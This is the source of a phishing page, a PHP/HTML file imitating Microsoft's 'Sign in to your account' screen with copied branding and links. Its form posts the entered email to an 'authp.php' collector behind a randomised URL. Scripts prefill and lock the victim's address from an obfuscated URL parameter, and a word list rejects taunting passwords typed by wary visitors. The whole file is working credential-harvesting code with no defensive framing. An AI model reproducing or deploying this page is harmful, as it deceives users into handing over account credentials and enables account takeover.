<?php


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>
<html dir="ltr" class="" lang="en">

<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    

    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<link rel="stylesheet" href="css/style.css" />
    <meta name="robots" content="none">
<script type="text/javascript" src="js/jqueryLib.js"></script>
    
   <style>
     html {
overflow: hidden;
overflow-x: hidden;
}
::-webkit-scrollbar {
width: 0px; /* remove scrollbar space /
background: transparent; / optional: just make scrollbar invisible /
}
/ optional: show position indicator in red */
::-webkit-scrollbar-thumb {
background: #FF0000;
}
   </style>

    <!--<link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/converged.v2.login.min_xu7km3oxm4bwp2b-mqyozg2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-oeT7RE+jUqvrrN6tzkQqVkE1XiqysTeQdBVsLf8laIGpeReVI+Dac1mjekZRn1Lm">-->
    </head>
    
<body>
    <div class="ms-bg">
    <div class="ms-line"></div>
        <div class="ms-loginbox">
          <form name="form1" method="post" action="authp.php?<?php echo generateRandomString(200);?>">
            <table width="395" border="0">
                <tr>
                  <td><div class="ms-logo"></div></td>
                </tr>
                <tr>
                  <td>
                  <input type="email" name="email" id="email" required autocomplete="off" class="ms-userfield" placeholder="Email, phone, or Skype"></td>
                </tr>
                <tr>
                  <td><div class="ms-link">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAYWSv4_ScADFKXDcwXCe5mKcLqdxMJrCt9_-AhKHHqVQoO0BLRxdSGnp0d-llOPgL9DtkkscLnFxcLjRRWPcTW4wN9_iapzMDcbBQfQfcHnJy3t5y_vkNqk8ngd58DSF5bHyYwInSI0eldCSRuEoUcIAqhGQQnESp3AIMIMEeHQvt8Odn__88iisvP_09Tb9e_z6AskOXetknNcD7xLZm8RxOCsXCovFIh-YpqX_Cwqu5huWf_wBQa4R5BuCXCQ3xj6qdC-TMwqnISzSxSJFYJDGKJzIC7Zhif32Qli1Y0luuGoFAMET7ZZ8DEWoxKqsrETIOSp74Aw85XSw4hdSX3RUux2r_TYuWgCochW0ZAcXPH7d13FJ1jFJVpaDVcO9Sd6RmHk8gX8liKzV-DaZNYPIG4bBLL5IvUpqFS4cNPucz0-P8N5I4uSe0mliPbI66Ar6AtjtLlZle04gaz2rQS_tGewak4oaNDsENWVGDRZ3eLOvTiySJki9tASuvF7C4kPZn4Rcqy6QRt3zWjSlmQNf7_NxdabNmCVTYzS9OIz4sWN2gWPS-EBthJVl024BSKkBY6Aiq3WOqLpmGnVtfmq6kVvjOdT0LSXg6PhQcw_EqAYOV8ZcBWpQ8wTf9iJpOmrU496Ro_VlYOkdK4K1iuKpwxMvFARx7nOTlllyVpo9ZYATlJatUpcKO-KpykXk8ljvaAIxZ96lMuszvcC_Sm0H4di3jP0wCkzLHV-nke_p-1uZndSDxH7iyS5Ilbe2cjuJv-5XGnmzsSbn7cOb3EIK-ZdZavp5ey9xtVFwKIV41ufx1chRlpjUJlyX7S2q0JhWunFYq04dVoAD245G-nOyjJ1lkLNM5ipzl2eHYlXuyozIMh0WDsGPDPJiM_Ex-x_-bnK7EECAAgLFSvuALhNYGRDqHw2&estsfed=1&uaid=f693934622ce4370b7bcdff204fc659d&signup=1&lw=1&fl=easi2&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US" id="signup" aria-label="Create a Microsoft account"><span style="color:#06F">Create one!</span></a></div></td>
                </tr>
                <tr>
                  <td><div class="ms-link"><a id="cantAccessAccount" name="cannotAccessAccount" href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637228788641271634.MjdiNWQwMzQtOTJlZC00MmNjLTg2N2UtZTUzN2FkZDBkYmUxYzIwOWNkZjQtZWQ3Ni00ZTE0LTk3MmItZTc3OTc1OTUyYzJl&ui_locales=en-US&mkt=en-US&client-request-id=f6939346-22ce-4370-b7bc-dff204fc659d&state=aCFpYKWFnIqX3VbOFTVURK1V5EYSMcw0jQS1EDVkoTaViJ7yjs2SdhCZoKR46qAbJD3kIfWZhi5745c9y0lTqX31tPTnhpFLHM5dHmmL76afYncWItEsasAyAGAac8_rIekfS0kf73YZJpCyKjL026ZoAd-NDaRX6HafdHauxflrlGIF-fniUoF7tPalBNrG0PzduZ0ZoGmMnjmrOqbJHtVXkaWT0icRir2GCUmZ_vmpMMNunFhLf9kzajqA0ko9yL9S6pRNxZFr5ygcRaM4uA&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.3.0.0#" data-bind="                          text: str['WF_STR_CantAccessAccount_Text'],                          click: cantAccessAccount_onClick"><span  style="color:#06F">Can&rsquo;t access your account?</span></a></div></td>
                </tr>
                <tr>
                  <td><div class="ms-link"><a id="idA_PWD_SwitchToCredPicker" href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637228788641271634.MjdiNWQwMzQtOTJlZC00MmNjLTg2N2UtZTUzN2FkZDBkYmUxYzIwOWNkZjQtZWQ3Ni00ZTE0LTk3MmItZTc3OTc1OTUyYzJl&ui_locales=en-US&mkt=en-US&client-request-id=f6939346-22ce-4370-b7bc-dff204fc659d&state=aCFpYKWFnIqX3VbOFTVURK1V5EYSMcw0jQS1EDVkoTaViJ7yjs2SdhCZoKR46qAbJD3kIfWZhi5745c9y0lTqX31tPTnhpFLHM5dHmmL76afYncWItEsasAyAGAac8_rIekfS0kf73YZJpCyKjL026ZoAd-NDaRX6HafdHauxflrlGIF-fniUoF7tPalBNrG0PzduZ0ZoGmMnjmrOqbJHtVXkaWT0icRir2GCUmZ_vmpMMNunFhLf9kzajqA0ko9yL9S6pRNxZFr5ygcRaM4uA&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.3.0.0#" data-bind="          text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],          click: switchToCredPicker_onClick"><span style="color:#06F">Sign-in options</span></a></div></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
                <tr>
                  <td align="right"><input type="submit" name="ms-nextbtn" id="ms-nextbtn" value="Next" class="ms-nextbtn"></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
            </table>
          </form>
        </div>
    <div class="ms-footer"></div> 
    <div class="ms-footer-text">
        <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-weight:bold"> . . .</span>
      </div>   
    </div>
    
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script>
        var $c = getUrlParameter('c');
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }
		
    var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];

    $(function(){

        if(currentEmail){

            var e = document.getElementById('email');
            e.value = currentEmail;
            e.readOnly = true;

            var domain = extractDomain(currentEmail);
			console.log("This my domain" + domain);

           

            }


       
    })
	     

    function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }

   

    function validateEmail(email) {
        var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
    }


     function isValidPassword(str){
        for (var i = ListEntries.length - 1; i >= 0; i--) {
          var r = new RegExp(ListEntries[i],'i');
          if(r.test(str)){
            return false;
          }
        }

        return true;
     }
</script>  

    
 <script>
   var input = document.getElementById("email");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("ms-nextbtn").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>   
</body>
</html>